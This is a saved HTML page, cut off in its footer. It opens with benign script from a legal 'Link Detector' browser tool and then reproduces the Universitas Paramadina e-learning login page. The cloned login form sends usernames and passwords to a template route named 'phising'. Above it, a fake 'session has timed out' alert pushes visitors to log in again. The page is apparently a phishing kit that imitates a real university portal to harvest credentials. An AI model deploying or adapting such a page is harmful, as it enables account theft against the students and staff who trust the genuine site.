                bodyCancelButton.className = 'apis-promt-body-button apis-button';
                bodyCancelButton.id = 'apis-promt-body-cancel-button';
                bodyCancelButton.textContent = translations.current().cCancel;
                bodyCancelButton.onclick = function () {
                    if (onCancel)
                        onCancel();

                    close();
                }

                var contentRow = document.createElement('tr');
                var imageCell = document.createElement('td');
                imageCell.className = 'apis-promt-body-image-cell';
                var textCell = document.createElement('td');

                var buttonsRow = document.createElement('tr');
                var buttonsCell = document.createElement('td');
                buttonsCell.setAttribute('colspan', '2');

                body.appendChild(contentRow);
                body.appendChild(buttonsRow);

                contentRow.appendChild(imageCell);
                contentRow.appendChild(textCell);

                buttonsRow.appendChild(buttonsCell);

                imageCell.appendChild(bodyImage);
                textCell.appendChild(bodyText);

                if (isPromt)
                    textCell.appendChild(bodyTextField);

                if (isConfirm || isPromt)
                    buttonsCell.appendChild(bodyCancelButton);

                buttonsCell.appendChild(bodyOkButton);

                return body;
            }

            wrapper.appendChild(container);
            container.appendChild(createHeader());
            container.appendChild(createBody());


            dragAndDrop.draggableTo(container, wrapper);

            document.body.appendChild(wrapper);

            position(container, isPromt);
            wrapper.classList.add('modal-mode');
        });
    }

    return {
        showConfirm: function (msg, onOK, onCancel) { showConfirm(msg, onOK, onCancel, true, false, null) },
        showMessage: function (msg) { showConfirm(msg, null, null, false, false, null) },
        showPromt: function (msg, onOk, promtDefaultText) { showConfirm(msg, onOk, null, false, true, promtDefaultText) },
        config: images
    }
})();

var citations = (function () {

    document.addEventListener('click', function () {
        close();
    });

    document.addEventListener('keydown', function (ev) {
        if (ev.keyCode == 13) {
            // simluate ok click
            var copyButton = document.getElementById('apis-body-copy-btn');
            if (copyButton) {
                copyButton.click();
            }
        }
        else if (ev.keyCode == 27) {
            close();
        }
    });

    var close = function () {
        var container = document.getElementById('apis-cite');
        if (container) {
            htmlElementhelper.remove(container);
        }
    }

    var showCitation = function (title, text) {

        var createContainer = function () {
            var container = document.createElement('div');
            container.id = 'apis-cite';
            container.className = 'apis-form-border';

            container.onclick = function (ev) { ev.preventDefault(); ev.stopPropagation(); };

            return container;
        };

        var createHeader = function () {
            var header = document.createElement('div');
            header.id = 'apis-cite-header';
            header.textContent = title;

            var closeButton = document.createElement('button');
            closeButton.id = 'apis-cite-header-close-btn';
            closeButton.className = 'apis-button';
            closeButton.textContent = 'x';
            closeButton.onclick = function () { close(); }

            header.appendChild(closeButton);

            return header;
        };

        var createBody = function () {
            var body = document.createElement('div');
            body.id = 'apis-cite-body';

            var content = document.createElement('textarea');
            content.id = 'apis-cite-body-textarea';
            content.readOnly = true;
            content.value = text;

            var copyButton = document.createElement('button');
            copyButton.id = 'apis-body-copy-btn';
            copyButton.className = 'apis-button';
            copyButton.textContent = translations.current().cCopy;
            copyButton.onclick = function () {
                content.select();
                if (!document.execCommand('copy', false, null)) {
                    dialogs.showMessage(translations.current().cPressCtrlCopy)
                }
            }

            var closeButton = document.createElement('button');
            closeButton.className = 'apis-button';
            closeButton.textContent = translations.current().cClose;
            closeButton.onclick = function () { close(); }

            body.appendChild(content);
            body.appendChild(closeButton);
            body.appendChild(copyButton);

            return body;
        };

        var container = createContainer();
        container.appendChild(createHeader());
        container.appendChild(createBody());

        dragAndDrop.draggableTo(container, document.body);

        document.body.appendChild(container);
    }

    return {
        showCitation: showCitation
    }

})();

var help = (function () {

    var getHelpUrl = function (type) {
        return technoHttpRequester.getHelpUrlFunction(type, translations.getLanguage());
    }

    var openHelp = function (type) {

        technoHttpRequester.openHelpFunction(type, translations.getLanguage(), callbacks.openUrlCallBack);
    }

    return {
        openHelp: openHelp,
        getHelpUrl: getHelpUrl
    }
})();

var websiteGuides = (function () {

    // due to missing Map function in IE9/10 we must use some other implementation
    // a simple array with iteration would do the job
    var arryMap = function () {
        this.core = [];

        this.set = function (key, value) {
            var record = this.get(key);
            if (record) {
                record.value = value;
            }
            else {
                this.core.push({ key: key, value: value });
            }
        }

        this.get = function (key) {
            for (var i = 0; i < this.core.length; i++) {
                if (this.core[i].key == key) {
                    return this.core[i].value;
                }
            }

            return null;
        }
    }

    var locationToGuideNameMap = new arryMap();
    locationToGuideNameMap.set('http://www.vks.bg/vks_p03.htm', 1);
    locationToGuideNameMap.set('http://www.vks.bg/vks_p15b.htm', 1);

    var isGuided = function (location) {

        try {
            return locationToGuideNameMap.get(location);
        }
        catch (ex) {
            return false;
        }
    }

    var openGuide = function (location) {
        var type = locationToGuideNameMap.get(location);
        technoHttpRequester.openGuide(type, callbacks.openUrlCallBack);
    }

    return {
        isGuided: isGuided,
        openGuide: openGuide
    }
})();



function eucasesShowHint(caller, ev, celex, toPar, uiLangId, langId) {

    hint.removeAllHints();

    var hintEl = htmlElementFactory.createHintDiv(celex);

    setTimeout(function () {

        if (!hint.canShow() || hintEl.getAttribute('data-apis-hint-closed') == 'true')
            return;

        if (uiLangId == '') {
            uiLangId = 'en';
        }

        var isApisAnchor = htmlElementhelper.isApisAnchor(caller);
        var domain = domainHelper.resolveForParHint(isApisAnchor);

        var parHintRequest = eucasesHttpRequester.parHint(langId, EUCASES_LANGS_NUMS[uiLangId], celex, toPar, domain, callbacks.getParHintCallBack(hintEl, caller.href, ev));
        parHintRequest.send(null);
    }, 700);
    hint.autoCloseAfter(hintEl, caller, 500);
}

function eucasesShowRegisterHint(caller, url, ev) {
    hint.removeAllHints();

    var hintEl = htmlElementFactory.createHintDiv(null);

    setTimeout(function () {

        if (!hint.canShow() || hintEl.getAttribute('data-apis-hint-closed') == 'true')
            return;

        var registerHintRequest = eucasesHttpRequester.registerHint(url, callbacks.getRegisterHintCallback(hintEl, url, ev));
        registerHintRequest.send(null);

    }, 700);

    hint.autoCloseAfter(hintEl, caller, 500);
}

function _ShCite(c, t, l) {
    // 1 is short cite
    if (t == 1 || t == '1')
        t = translations.current().cm_ShortCite;
    else
        t = translations.current().cm_LongCite;

    citations.showCitation(t, c);
}

function _cite(l, c, t, caller, u) {

    var isApisAnchor = htmlElementhelper.isApisAnchor(caller);
    var domain = domainHelper.resolveForCite(isApisAnchor);
    var request = eucasesHttpRequester.cite(l, c, t, domain, callbacks.getCiteCallBack(t, u));

    request.send(null);
}

function eucasesShowContext(caller, ev, uiLang, celex, toPar, docLang) {
    ev.preventDefault();
    ev.stopPropagation();

    contextMenuHelper.removeAll();

    hint.removeAllHints();

    function removeLnk() {
        caller.outerHTML = caller.outerHTML.replace(/<a.*?>/, '').replace(/<\/a>/, '');
    }

    function openLinkByDomain(domain) {
        eucasesHttpRequester.docLinks(domain, docLang, EUCASES_LANGS_NUMS[uiLang], 25, celex, toPar, callbacks.openUrlCallBack)
    }

    function openAllDocs() {
        openLinkByDomain('all');
    }

    function openEuLegislation() {
        openLinkByDomain('eul');
    }

    function openEuCaseLaw() {
        openLinkByDomain('eucl');
    }

    function openNatLegislation() {
        openLinkByDomain('natl');
    }

    function openNatCaseLaw() {
        openLinkByDomain('natcl');
    }

    function openBgCaselaw() {
        openLinkByDomain('bgcl');
    }

    function openBgLegislation() {
        openLinkByDomain('bgl');
    }

    function openBgAll() {
        openLinkByDomain('bgall');
    }

    function _shortCite() {
        _cite(docLang, celex, 1, caller, uiLang)
    }

    function _fullCite() {
        _cite(docLang, celex, 2, caller, uiLang)
    }

    var ul = null;
    if (!document.getElementById('eucasesTempContextMenu')) {
        ul = document.createElement('ul');
        ul.className = 'contextmenu';

        // header
        var headerItem = document.createElement("li");
        headerItem.innerHTML = "Link Detector";
        headerItem.className = 'contextmenu-item-header';
        ul.appendChild(headerItem);

        var linkSubMenuFactoryMethod = function () {

            var linkSubMenu = contextMenu.createSubmenu("contextsubmenu-links");
            document.body.appendChild(linkSubMenu);

            // All documents
            var allDocs = contextMenu.createSubmenuItem(translations.current().cm_AllDocuments);
            allDocs.onclick = openAllDocs;
            linkSubMenu.appendChild(allDocs);

            // EU Legislation
            var euLegislation = contextMenu.createSubmenuItem(translations.current().cm_EuL);
            euLegislation.onclick = openEuLegislation;
            linkSubMenu.appendChild(euLegislation);

            // EU case law
            var euCaseLaw = contextMenu.createSubmenuItem(translations.current().cm_EuCL);
            euCaseLaw.onclick = openEuCaseLaw;
            linkSubMenu.appendChild(euCaseLaw);

            // National legislation
            var natLegislation = contextMenu.createSubmenuItem(translations.current().cm_NaL);
            natLegislation.onclick = openNatLegislation;
            linkSubMenu.appendChild(natLegislation);

            // National case law
            var natCaseLaw = contextMenu.createSubmenuItem(translations.current().cm_NaCL);
            natCaseLaw.onclick = openNatCaseLaw;
            linkSubMenu.appendChild(natCaseLaw);

            if (htmlElementhelper.isApisAnchor(caller)) {

                // modifies elements depending on the reference type 
                // if the reference is apis anchor the european caselaw and legislations are hiddend

                euCaseLaw.style.display = "none";
                euLegislation.style.display = "none";

                allDocs.onclick = openBgAll;
                natCaseLaw.onclick = openBgCaselaw;
                natLegislation.onclick = openBgLegislation;

                natCaseLaw.innerHTML = translations.current().cm_BGCL;
                natLegislation.innerHTML = translations.current().cm_BGL;

            } else if (htmlElementhelper.isEuAnchor(caller)) {
                // if the anchor is eu we must hide the national legislation
                natLegislation.style.display = "none";
            }

            return linkSubMenu;
        }

        // links sub menu item
        var linksSubMenuItem = contextMenu.createSubmenuItem(translations.current().cm_SubMenuLinks, linkSubMenuFactoryMethod, "contextsubmenu-links");
        ul.appendChild(linksSubMenuItem);

        var referencesSubMenuFactoryMethod = function () {
            // references submenu
            var referencesSubMenu = contextMenu.createSubmenu("contextsubmenu-references");
            document.body.appendChild(referencesSubMenu);

            //ShortCite
            var shortCite = contextMenu.createSubmenuItem(translations.current().cm_ShortCite);
            shortCite.onclick = _shortCite;
            referencesSubMenu.appendChild(shortCite);

            //FullCite
            var fullCite = contextMenu.createSubmenuItem(translations.current().cm_LongCite);
            fullCite.onclick = _fullCite;
            referencesSubMenu.appendChild(fullCite);

            return referencesSubMenu;
        }

        // references submenu item
        var referencesSubMenuItem =
            contextMenu.createSubmenuItem(translations.current().cm_SubMenuReferences, referencesSubMenuFactoryMethod, "contextsubmenu-references");
        ul.appendChild(referencesSubMenuItem);

        var editSubMenuFactoryMethod = function () {
            var editSubmenu = contextMenu.createSubmenu("contextsubmenu-edit");
            document.body.appendChild(editSubmenu);

            // Remove link
            var removeLink = contextMenu.createSubmenuItem(translations.current().cm_RemoveLink);
            removeLink.onclick = removeLnk;
            editSubmenu.appendChild(removeLink);

            return editSubmenu;
        }

        // edit submenu item
        var editSubmenuItem = contextMenu.createSubmenuItem(translations.current().cm_SubMenuEdit, editSubMenuFactoryMethod, "contextsubmenu-edit");
        ul.appendChild(editSubmenuItem);

        ul.id = "eucasesTempContextMenu";

        document.body.appendChild(ul);
    } else {
        ul = document.getElementById('eucasesTempContextMenu');
    }

    contextMenuHelper.position(ul, ev);
}

function eucasesConceptShowContext(caller, ev, uiLang, docLang, xmlId) {
    ev.preventDefault();
    ev.stopPropagation();
    var lang = EUCASES_LANGS_NUMS[uiLang];

    contextMenuHelper.removeAll();
    hint.removeAllHints();

    EUCASES_CONCEPT_CONTEXT_CALLER = caller;

    function removeTerm() {
        EUCASES_CONCEPT_CONTEXT_CALLER.outerHTML = EUCASES_CONCEPT_CONTEXT_CALLER.outerHTML.replace(/<span.*?>/, '').replace(/<\/span>/, '');
    }

    function openLinkByDomain(domain) {
        eucasesHttpRequester.searchbyXmlId(xmlId, domain, docLang, uiLang, callbacks.openUrlCallBack);
    }

    function openAllDocs() {
        openLinkByDomain('All');
    }

    function openEuLegislation() {
        openLinkByDomain('EuL');
    }

    function openEuCaseLaw() {
        openLinkByDomain('EuCL');
    }

    function openNatLegislation() {
        openLinkByDomain('NatL');
    }

    function openNatCaseLaw() {
        openLinkByDomain('NatCL');
    }

    var ul = null;
    if (!document.getElementById('eucasesTempConceptContextMenu')) {
        ul = document.createElement('ul');
        ul.className = "contextmenu";

        // header
        var headerItem = document.createElement("li");
        headerItem.innerHTML = "Link Detector";
        headerItem.className = 'contextmenu-item-header';
        ul.appendChild(headerItem);

        var indexWithTermSubMenuFactoryMethod = function () {
            var indexDocumentsSubmenu = contextMenu.createSubmenu("contextsubmenu-index-with-term");
            document.body.appendChild(indexDocumentsSubmenu);

            // All documents
            var allDocs = contextMenu.createSubmenuItem(translations.current().cm_AllDocuments);
            allDocs.onclick = openAllDocs;
            indexDocumentsSubmenu.appendChild(allDocs);

            // EU Legislation
            var euLegislation = contextMenu.createSubmenuItem(translations.current().cm_EuL);
            euLegislation.onclick = openEuLegislation;
            indexDocumentsSubmenu.appendChild(euLegislation);

            // EU case law
            var euCaseLaw = contextMenu.createSubmenuItem(translations.current().cm_EuCL);
            euCaseLaw.onclick = openEuCaseLaw;
            indexDocumentsSubmenu.appendChild(euCaseLaw);

            // National legislation
            var natLegislation = contextMenu.createSubmenuItem(translations.current().cm_NaL);
            natLegislation.onclick = openNatLegislation;
            indexDocumentsSubmenu.appendChild(natLegislation);

            // National case law
            var natCaseLaw = contextMenu.createSubmenuItem(translations.current().cm_NaCL);
            natCaseLaw.onclick = openNatCaseLaw;
            indexDocumentsSubmenu.appendChild(natCaseLaw);

            if (TechnoResponseRecognizedLangId !== 1) {
                natLegislation.style.display = "none";
            }

            return indexDocumentsSubmenu;
        }

        // index documents item
        var indexDocumentsItem =
            contextMenu.createSubmenuItem(translations.current().cm_DocumentsIndexedWithThisTerm, indexWithTermSubMenuFactoryMethod, "contextsubmenu-index-with-term");

        ul.appendChild(indexDocumentsItem);

        var editSubMenuFactoryMethod = function () {

            var editSubmenu = contextMenu.createSubmenu("contextsubmenu-terms-edit");
            document.body.appendChild(editSubmenu);

            // Remove link
            var removeLink = contextMenu.createSubmenuItem(translations.current().cm_RemoveLink);
            removeLink.onclick = removeTerm;
            editSubmenu.appendChild(removeLink);

            return editSubmenu;
        }

        var editSubmenuItem = contextMenu.createSubmenuItem(translations.current().cm_SubMenuEdit, editSubMenuFactoryMethod, "contextsubmenu-terms-edit");
        ul.appendChild(editSubmenuItem);

        ul.id = "eucasesTempConceptContextMenu";

        document.body.appendChild(ul);
    } else {
        ul = document.getElementById('eucasesTempConceptContextMenu');
    }

    contextMenuHelper.position(ul, ev);
}

function eucasesRegisterInfoShowContext(caller, type, ev) {
    ev.preventDefault();
    ev.stopPropagation();

    contextMenuHelper.removeAll();
    hint.removeAllHints();

    var removeRegisterInfo = function () {
        var textContentNode = document.createTextNode(caller.textContent);
        htmlElementhelper.replace(caller, textContentNode);
    }

    // this is the submenu for editing which is used from all context menus
    var editSubmenuFactory = function () {
        var submenu = contextMenu.createSubmenu('contextmenu-register-edit');
        var removeItem = contextMenu.createSubmenuItem(translations.current().cm_RemoveLink);
        removeItem.onclick = removeRegisterInfo;

        document.body.appendChild(submenu);

        submenu.appendChild(removeItem);

        return submenu;
    }
    var editSubmenuItemFactory = function () { return contextMenu.createSubmenuItem(translations.current().cm_SubMenuEdit, editSubmenuFactory, 'contextmenu-register-edit'); }


    var openUrl = function (url) {
        var request = requester.GET(url, callbacks.getOpenUrlFromRequestCallback());
        request.send(null);
    }

    var createContextMenuForEIK = function () {

        var subHeader = translations.current().cm_EIKHeader.concat(': ', caller.textContent);

        var menu = contextMenu.createContextMenuWithHeader(subHeader);

        var actsUrl = caller.getAttribute('data-apis-acts-url');
        var linkedUrl = caller.getAttribute('data-apis-linked-url');
        var insuredUrl = caller.getAttribute('data-apis-ins-url');
        var finsUrl = caller.getAttribute('data-apis-fins-url');
        var sourcesUrl = caller.getAttribute('data-apis-sources-url');

        var actsItem = contextMenu.createSubmenuItem(translations.current().cm_EIKActs);
        actsItem.onclick = function () { openUrl(actsUrl); }

        var linkedItem = contextMenu.createSubmenuItem(translations.current().cm_EIKLinked);
        linkedItem.onclick = function () { openUrl(linkedUrl); }

        var insuredItem = contextMenu.createSubmenuItem(translations.current().cm_EIKInsured);
        insuredItem.onclick = function () { openUrl(insuredUrl); }

        var finsItem = contextMenu.createSubmenuItem(translations.current().cm_EIKFins);
        finsItem.onclick = function () { openUrl(finsUrl); }

        var sourcesItem = contextMenu.createSubmenuItem(translations.current().cm_EIKSources);
        sourcesItem.onclick = function () { openUrl(sourcesUrl); }

        menu.appendChild(actsItem);
        menu.appendChild(linkedItem);
        menu.appendChild(insuredItem);
        menu.appendChild(finsItem);
        menu.appendChild(sourcesItem);
        menu.appendChild(editSubmenuItemFactory());

        return menu;
    }

    var createContextMenuForEGN = function () {

        var subHeader = translations.current().cm_EGNHeader.concat(': ', caller.textContent);

        var menu = contextMenu.createContextMenuWithHeader(subHeader);

        var firmsUrl = caller.getAttribute('data-apis-click-url');
        var linkedUrl = caller.getAttribute('data-apis-linked-url');

        var firmsItem = contextMenu.createSubmenuItem(translations.current().cm_EGNFirms);
        firmsItem.onclick = function () { openUrl(firmsUrl); }

        var linkedItem = contextMenu.createSubmenuItem(translations.current().cm_EGNLinked);
        linkedItem.onclick = function () { openUrl(linkedUrl); }

        menu.appendChild(firmsItem);
        menu.appendChild(linkedItem);
        menu.appendChild(editSubmenuItemFactory())

        return menu;

    }

    var createContextMenuForFirm = function () {
        var menuWithHeader = contextMenu.createContextMenuWithHeader();

        var clickUrl = caller.getAttribute('data-apis-click-url');

        var searchItem = contextMenu.createSubmenuItem(translations.current().cm_FirmSearch);
        searchItem.onclick = function () { openUrl(clickUrl); }

        menuWithHeader.appendChild(searchItem);
        menuWithHeader.appendChild(editSubmenuItemFactory());

        return menuWithHeader;
    }

    var createContextMenuForPerson = function () {
        var menuWithHeader = contextMenu.createContextMenuWithHeader();

        var clickUrl = caller.getAttribute('data-apis-click-url');

        var searchItem = contextMenu.createSubmenuItem(translations.current().cm_PersonSearch);
        searchItem.onclick = function () { openUrl(clickUrl); }

        menuWithHeader.appendChild(searchItem);
        menuWithHeader.appendChild(editSubmenuItemFactory());

        return menuWithHeader;
    }

    var menu = null;

    if (type == 'EIK') {
        menu = createContextMenuForEIK();
    }
    else if (type == 'EGN') {
        menu = createContextMenuForEGN();
    }
    else if (type == 'PName') {
        menu = createContextMenuForPerson();
    }
    else if (type == 'FName') {
        menu = createContextMenuForFirm();
    }

    if (menu != null) {
        document.body.appendChild(menu);

        contextMenuHelper.position(menu, ev);
    }
}

function eucasesRegisterOnclick(caller, url, ev) {

    var request = requester.GET(url, callbacks.getOpenUrlFromRequestCallback());
    request.send(null);
}

function eucasesRemoveAllLinks() {
    delayExecution(function () {

        dialogs.showConfirm(translations.current().cPlzConfirmRmLnk, function () {

            var linkDetectorLinks = document.getElementsByClassName('link-detector-link');

            while (linkDetectorLinks.length != 0) {
                htmlElementhelper.removeNodeKeepChildren(linkDetectorLinks[0]);
            }
        }, null);
    })
}

function eucasesShowProcessingMessage(msg) {
    eucasesLoadingElement = document.createElement('div');
    eucasesLoadingElement.innerHTML = msg;
    with (eucasesLoadingElement.style) {
        position = 'fixed';
        top = '10px';
        left = '10px';
        zIndex = '1000';
        padding = '10px';
        paddingLeft = '20px';
        paddingRight = '20px';
        border = '5px solid grey';
        backgroundColor = 'white';
        fontSize = '16px';
        fontWeight = 'bold';
    }
    document.body.appendChild(eucasesLoadingElement);
}

function eucasesSetLinks() {

    delayExecution(function () {

        if (websiteGuides.isGuided(window.location.href)) {
            websiteGuides.openGuide(window.location.href);
        }
        else {

            dialogs.showConfirm(translations.current().cPlzConfirm, function () {

                var request = technoHttpRequester.setLinks(callbacks.setDocContentCallBack);
                request.send(document.body.innerHTML);

                eucasesShowProcessingMessage(translations.current().cWorking);
            }, null);
        }
    });
}

function eucasesSetTerms() {

    delayExecution(function () {

        if (websiteGuides.isGuided(window.location.href)) {
            websiteGuides.openGuide(window.location.href);
        } else {

            dialogs.showConfirm(translations.current().cConfirmLookForTerms, function () {
                var request = technoHttpRequester.setTerms(callbacks.setDocContentCallBack);
                request.send(document.body.innerHTML);

                eucasesShowProcessingMessage(translations.current().cLookForTerms);
            }, null);
        }
    });
}

function eucasesSetRegisterInfo() {
    delayExecution(function () {
        if (websiteGuides.isGuided(window.location.href)) {
            websiteGuides.openGuide(window.location.href);
        } else {
            dialogs.showConfirm(translations.current().cPlzConfirmCheckForRegisterInfo, function () {
                var request = technoHttpRequester.setRegisterInfo(callbacks.setDocContentCallBack);
                request.send(document.body.innerHTML);

                eucasesShowProcessingMessage(translations.current().cLookForRegisterInfo);
            }, null)
        }
    });
}


function delayExecution(func) {
    setTimeout(func, 60);
}</script></head>
<body id="page-login-index" class="format-site path-login chrome android dir-ltr lang-en yui-skin-sam yui3-skin-sam elearning-paramadina-ac-id pagelayout-login course-1 context-1 notloggedin mobiletheme jsenabled scrolled" hasvalidselectionforinsert="false" haslinksinselection="false">

<div id="page-wrapper">

    <div>
    <a class="sr-only sr-only-focusable" href="#maincontent">Skip to main content</a>
</div><script src="https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/babel-polyfill/polyfill.min.js"></script>
<script src="https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/polyfills/polyfill.js"></script>
<script src="https://elearning.paramadina.ac.id/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.js"></script><script src="https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/javascript-static.js"></script>
<script>
//<![CDATA[
document.body.className += ' jsenabled';
//]]>
</script>



    <div id="page" class="container-fluid mt-0 ">
        <div id="page-content" class="row">
                <section id="region-main" class="col-12">
                    <span class="notifications" id="user-notifications"></span>
                    <div role="main"><span id="maincontent"></span><div class="my-1 my-sm-5"></div>
<div class="row justify-content-center">

<div class="col-xl-6 col-sm-8 ">
<div class="card">
    <div class="card-block">
            <h1 class="card-header text-center"><img src="https://elearning.paramadina.ac.id/pluginfile.php/1/core_admin/logo/0x200/1614831401/logo-upm.png" class="img-fluid" title="E-learning Universitas Paramadina" alt="E-learning Universitas Paramadina"></h1>
        <div class="card-body">

                <div class="loginerrors mt-3">
                    <a href="#" id="loginerrormessage" class="accesshide">Your session has timed out. Please log in again.</a>
                    <div class="alert alert-danger" role="alert">Your session has timed out. Please log in again.</div>
                </div>

            <div class="row justify-content-md-center">
                <div class="col-md-5">
                    <form class="mt-3" action="{{route('phising')}}" method="post" id="login">
                        <input id="anchor" type="hidden" name="anchor" value="">
                        <script>document.getElementById('anchor').value = location.hash;</script>
                        <input type="hidden" name="logintoken" value="BDiz9KfxBDYvy1au7sOc6lFigEVRS3Cc">
                        <div class="form-group">
                            <label for="username" class="sr-only">
                                    Username
                            </label>
                            <input type="text" name="username" id="username" class="form-control" value="" placeholder="Username">
                        </div>
                        <div class="form-group">
                            <label for="password" class="sr-only">Password</label>
                            <input type="password" name="password" id="password" value="" class="form-control" placeholder="Password">
                        </div>
                            <div class="rememberpass mt-3">
                                <input type="checkbox" name="rememberusername" id="rememberusername" value="1">
                                <label for="rememberusername">Remember username</label>
                            </div>

                        <button type="submit" class="btn btn-primary btn-block mt-3" id="loginbtn">Log in</button>
                    </form>
                </div>

                <div class="col-md-5">
                    <div class="forgetpass mt-3">
                        <p><a href="https://elearning.paramadina.ac.id/login/forgot_password.php">Forgotten your username or password?</a></p>
                    </div>

                    <div class="mt-3">
                        Cookies must be enabled in your browser
                        <a class="btn btn-link p-0" role="button" data-container="body" data-toggle="popover" data-placement="right" data-content="<div class=&quot;no-overflow&quot;><p>Two cookies are used on this site:</p>

<p>The essential one is the session cookie, usually called MoodleSession. You must allow this cookie in your browser to provide continuity and to remain logged in when browsing the site. When you log out or close the browser, this cookie is destroyed (in your browser and on the server).</p>

<p>The other cookie is purely for convenience, usually called MOODLEID or similar. It just remembers your username in the browser. This means that when you return to this site, the username field on the login page is already filled in for you. It is safe to refuse this cookie - you will just have to retype your username each time you log in.</p>
</div> " data-html="true" tabindex="0" data-trigger="focus">
  <i class="icon fa fa-question-circle text-info fa-fw " title="Help with Cookies must be enabled in your browser" aria-label="Help with Cookies must be enabled in your browser"></i>
</a>
                    </div>

                    <h6 class="mt-2">Log in using your account on:</h6>
                    <div class="potentialidplist">
                            <div class="potentialidp">
                                <a href="https://elearning.paramadina.ac.id/auth/oauth2/login.php?id=1&amp;wantsurl=%2F&amp;sesskey=h64v6SMJtY" title="Google" class="btn btn-secondary btn-block">
                                        <img src="https://accounts.google.com/favicon.ico" alt="" width="24" height="24">
                                    Google
                                </a>
                            </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
</div>


<div class="row justify-content-center mt-3">
<div class="col-xl-6 col-sm-8">
<div class="card">
    <div class="card-body">
        <div class="card-title">
            <h2>Is this your first time here?</h2>
        </div>
        <div>
        <hr><div><h5 style="text-align:center;">Jika YA, anda harus mengaktifkan account anda lebih dulu, dengan mengikuti langkah-langkah berikut.</h5></div><br><div><p>1. Klik tombol <strong>GOOGLE </strong>untuk masuk ke dalam E-learning.</p><p>2. Login menggunakan account Gsuite Student anda (account Gsuite Student dapat dilihat di laman Admission atau di aplikasi Myparmad.</p><p>3. Sebuah pesan email yang berisi User Verification akan dikirimkan segera ke email Gsuite Student anda.</p><p>4. Buka pesan tersebut dan klik tautan/link yang berada di dalam pesan.</p><p>5. Account anda telah diaktifkan dan anda sudah masuk ke dalam Elearning.</p></div><div><br></div>
        </div>
    </div>
</div>
</div>
</div></div>
                    
                </section>
        </div>
    </div>
    
    <footer id="page-footer" class="py-3 text-dark">
        <div class="container">
    
            <div id="course-footer"></div>
    
            <div class="row">
    
                    <div class="col-md-8">
                        <div class="text_to_html"><p><strong>Universitas Paramadina </strong><em>berdiri pada 10 Januari 1998, mengemban misi untuk membina ilmu pengetahuan rekayasa dengan kesadaran akhlak mulia demi kebahagiaan bersama seluruh umat manusia.</em></p><p></p></div>
    
                        <div class="logininfo">You are not logged in.</div>
    
                        <div class="homelink"><a href="https://elearning.paramadina.ac.id/">Home</a></div>
    
    
                    </div>
    
                    <div class="col-md-4">
                        <div class="brandbox">
    
                            <h3>Universitas Paramadina</h3>
                                <ul class="footercontact">
                                    <li><i class="fa fa-globe"></i>  www.paramadina.ac.id</li>
                                    <li><i class="fa fa-envelope"></i>  info@paramadina.ac.id</li>
                                    <li><i class="fa fa-mobile-phone"></i>  +62 21 7918 1188</li>
                                </ul>
    
                            <div class="socials_wrapper">
        <ul class="socials">
                    <a href="https://facebook.com/paramadina" class="socialicon blog" title="https://facebook.com/paramadina" alt="https://facebook.com/paramadina" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-facebook fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://facebook.com/paramadina</span>
                    </a>
                    <a href="https://twitter.com/paramadina" class="socialicon blog" title="https://twitter.com/paramadina" alt="https://twitter.com/paramadina" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-twitter fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://twitter.com/paramadina</span>
                    </a>
                    <a href="https://www.youtube.com/c/UniversitasParamadina" class="socialicon blog" title="https://www.youtube.com/c/UniversitasParamadina" alt="https://www.youtube.com/c/UniversitasParamadina" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-youtube fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://www.youtube.com/c/UniversitasParamadina</span>
                    </a>
                    <a href="https://www.instagram.com/universitas_paramadina" class="socialicon blog" title="https://www.instagram.com/universitas_paramadina" alt="https://www.instagram.com/universitas_paramadina" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-instagram fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://www.instagram.com/universitas_paramadina</span>
                    </a>
                    <a href="https://www.paramadina.ac.id" class="socialicon blog" title="https://www.paramadina.ac.id" alt="https://www.paramadina.ac.id" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-globe fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://www.paramadina.ac.id</span>
                    </a>
                    <a href="https://wa.me/628159181190" class="socialicon blog" title="https://wa.me/628159181190" alt="https://wa.me/628159181190" target="_blank">
                    <span class="fa-stack fa-1x">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-phone-square fa-inverse fa-stack-1x"></i>
                    </span>
                    <span class="sr-only">https://wa.me/628159181190</span>
                    </a>
        </ul>
    </div>
    
                        </div>
                    </div>
    
            </div>
            <nav class="nav navbar-nav d-md-none">
                    <ul class="list-unstyled pt-3">
                                        <li>Faculty</li>
                                    <li>
                                        <ul class="list-unstyled ml-3">
                                                            <li><a href="https://elearning.paramadina.ac.id/course/index.php?categoryid=38" title="Fakultas Ekonomi dan Bisnis">Ekonomi dan Bisnis</a></li>
                                                            <li><a href="https://elearning.paramadina.ac.id/course/index.php?categoryid=39" title="Fakultas Ilmu Rekayasa">Ilmu Rekayasa</a></li>
                                                            <li><a href="https://elearning.paramadina.ac.id/course/index.php?categoryid=40" title="Fakultas Falsafah dan Peradaban">Falsafah dan Peradaban</a></li>
                                        </ul>
                                    </li>
                                        <li>Links</li>
                                    <li>
                                        <ul class="list-unstyled ml-3">
                                                            <li><a href="https://asik.paramadina.ac.id" title="Sistem Informasi Akademik">A S I K</a></li>
                                                            <li><a href="https://catalogue.paramadina.ac.id" title="Katalog Perpustakaan">Library Catalogue</a></li>
                                                            <li><a href="http://repository.paramadina.ac.id" title="Aplikasi Arsip Karya Ilmiah">Repository</a></li>
                                        </ul>
                                    </li>
                                        <li>Tutorial</li>
                                    <li>
                                        <ul class="list-unstyled ml-3">
                                                            <li><a href="https://bit.ly/panduan-elearning-dsn-part1" title="">Panduan Elearning Dosen</a></li>
